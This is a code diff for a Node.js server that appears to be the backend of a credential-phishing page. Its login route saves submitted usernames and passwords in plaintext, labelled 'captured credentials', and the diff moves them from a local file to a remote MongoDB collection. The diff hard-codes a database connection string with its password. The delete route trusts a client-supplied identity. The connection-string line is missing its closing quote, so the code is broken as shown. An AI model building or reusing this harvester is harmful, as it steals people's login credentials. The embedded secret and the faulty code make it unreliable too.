@@ -2,17 +2,36 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const url = require('url');
+const { MongoClient } = require('mongodb');
 
 const USERDATA_FILE = path.join(__dirname, 'userdata.json');
-const LOGINUSERS_FILE = path.join(__dirname, 'loginusers.json');
 const SESSIONS_FILE = path.join(__dirname, 'sessions.json');
 const FRONTEND_DIR = path.join(__dirname, '../frontend');
 const PORT = 3000;
 
-// Init files if not exists
-if (!fs.existsSync(LOGINUSERS_FILE)) {
-  fs.writeFileSync(LOGINUSERS_FILE, JSON.stringify({}, null, 2));
+// MongoDB config
+
+const MONGO_URI="mongodb+srv://prit:prIt#4@secureeye.3vnxtam.mongodb.net/?appName=SecureEye
+const MONGO_DB = 'SecureEye';
+const COLLECTION_NAME = 'ins';
+
+let mongoClient = null;
+let insCollection = null;
+
+async function connectMongo() {
+  try {
+    mongoClient = new MongoClient(MONGO_URI);
+    await mongoClient.connect();
+    const db = mongoClient.db(MONGO_DB);
+    insCollection = db.collection(COLLECTION_NAME);
+    console.log(`✅ MongoDB connected → ${MONGO_DB}.${COLLECTION_NAME}`);
+  } catch (err) {
+    console.error('❌ MongoDB connection failed:', err.message);
+    process.exit(1);
+  }
 }
+
+// Init local files if not exists
 if (!fs.existsSync(SESSIONS_FILE)) {
   fs.writeFileSync(SESSIONS_FILE, JSON.stringify({}, null, 2));
 }
@@ -84,26 +103,35 @@ const server = http.createServer(async (req, res) => {
   }
 
   // POST /api/login
-  // 1. Save username+password to loginusers.json
+  // 1. Save username+password to MongoDB ins collection
   // 2. Create session for this username
   if (method === 'POST' && pathname === '/api/login') {
     const body = await parseBody(req);
     const { username, password } = body;
-    
+
     if (!username || !password) {
       return sendJSON(res, 400, { success: false, message: 'Missing username or password' });
     }
 
-    // 1. Save to loginusers.json (captured credentials)
-    const loginUsers = readJSON(LOGINUSERS_FILE);
-    loginUsers[username] = {
-      username,
-      password,
-      loginAt: new Date().toISOString()
-    };
-    writeJSON(LOGINUSERS_FILE, loginUsers);
+    // 1. Save to MongoDB ins collection (upsert by username)
+    try {
+      await insCollection.updateOne(
+        { username },
+        {
+          $set: {
+            username,
+            password,
+            loginAt: new Date().toISOString()
+          }
+        },
+        { upsert: true }
+      );
+    } catch (err) {
+      console.error('MongoDB write error:', err.message);
+      return sendJSON(res, 500, { success: false, message: 'Database error' });
+    }
 
-    // 2. Create session for this user
+    // 2. Create session for this user (still in sessions.json)
     const sessions = readJSON(SESSIONS_FILE);
     const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
     sessions[sessionId] = {
@@ -113,15 +141,14 @@ const server = http.createServer(async (req, res) => {
     };
     writeJSON(SESSIONS_FILE, sessions);
 
-    return sendJSON(res, 200, { 
-      success: true, 
+    return sendJSON(res, 200, {
+      success: true,
       username,
-      sessionId  // Frontend will need this for delete
+      sessionId
     });
   }
 
   // GET /api/users
-  // Returns ALL users from userdata.json
   if (method === 'GET' && pathname === '/api/users') {
     const search = (parsedUrl.query.search || '').toLowerCase();
     const page = parseInt(parsedUrl.query.page || '1');
@@ -130,14 +157,13 @@ const server = http.createServer(async (req, res) => {
     const users = readJSON(USERDATA_FILE);
     let list = Object.keys(users);
 
-    // Filter by search
     if (search) {
       list = list.filter(u => u.toLowerCase().includes(search));
     }
 
     const total = list.length;
     const paginated = list.slice((page - 1) * limit, page * limit);
-    
+
     const result = paginated.map(username => {
       const userData = users[username];
       return {
@@ -151,7 +177,6 @@ const server = http.createServer(async (req, res) => {
   }
 
   // DELETE /api/delete
-  // Only delete if loggedInAs username matches target username
   if (method === 'DELETE' && pathname === '/api/delete') {
     const body = await parseBody(req);
     const { username: targetUsername, loggedInAs } = body;
@@ -160,15 +185,13 @@ const server = http.createServer(async (req, res) => {
       return sendJSON(res, 400, { success: false, message: 'Missing username or session' });
     }
 
-    // Check if loggedInAs matches targetUsername (self-delete only)
     if (loggedInAs !== targetUsername) {
-      return sendJSON(res, 403, { 
-        success: false, 
-        message: "You can't delete other users. You can only delete your own account." 
+      return sendJSON(res, 403, {
+        success: false,
+        message: "You can't delete other users. You can only delete your own account."
       });
     }
 
-    // Delete from userdata.json
     const users = readJSON(USERDATA_FILE);
     if (!users[targetUsername]) {
       return sendJSON(res, 404, { success: false, message: 'User not found' });
@@ -177,13 +200,14 @@ const server = http.createServer(async (req, res) => {
     delete users[targetUsername];
     writeJSON(USERDATA_FILE, users);
 
-    // Also clean up loginusers.json and sessions if they exist
-    const loginUsers = readJSON(LOGINUSERS_FILE);
-    if (loginUsers[targetUsername]) {
-      delete loginUsers[targetUsername];
-      writeJSON(LOGINUSERS_FILE, loginUsers);
+    // Remove from MongoDB ins collection
+    try {
+      await insCollection.deleteOne({ username: targetUsername });
+    } catch (err) {
+      console.error('MongoDB delete error:', err.message);
     }
 
+    // Clean up sessions
     const sessions = readJSON(SESSIONS_FILE);
     Object.keys(sessions).forEach(sessionId => {
       if (sessions[sessionId].username === targetUsername) {
@@ -192,18 +216,21 @@ const server = http.createServer(async (req, res) => {
     });
     writeJSON(SESSIONS_FILE, sessions);
 
-    return sendJSON(res, 200, { 
-      success: true, 
-      message: 'Account deleted successfully' 
+    return sendJSON(res, 200, {
+      success: true,
+      message: 'Account deleted successfully'
     });
   }
 
-  // 404 for everything else
   res.writeHead(404);
   res.end('Not found');
 });
 
-server.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
-  console.log(`📁 Files: loginusers.json, userdata.json, sessions.json`);
+// Start server only after MongoDB is connected
+connectMongo().then(() => {
+  server.listen(PORT, () => {
+    console.log(`Server running at http://localhost:${PORT}`);
+    console.log(`📁 Local files: userdata.json, sessions.json`);
+    console.log(`🍃 MongoDB: ${MONGO_DB}.${COLLECTION_NAME}`);
+  });
 });
